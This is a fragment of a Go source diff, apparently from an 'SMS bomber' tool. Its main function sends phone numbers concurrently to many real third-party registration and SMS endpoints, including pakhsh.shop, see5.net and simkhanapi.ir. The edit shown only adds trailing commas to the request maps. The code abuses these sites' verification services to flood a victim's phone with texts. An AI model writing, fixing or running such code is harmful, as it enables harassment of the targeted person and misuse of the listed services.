@@ -553,11 +553,11 @@ func main() {
 			"mobile­": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{
-			"phone": "phone"
+			"phone": "phone",
 		}, ch)  // edit :4/22/2025
 		s27 := fmt.Sprintf("'mobile': %s,'action': 'sendsms'", phone)
 		go sms("https://see5.net/phonenumberHandler.php", map[string]interface{}{
-			"phone": "phone"
+			"phone": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
 			"mobileNumber": "phone",
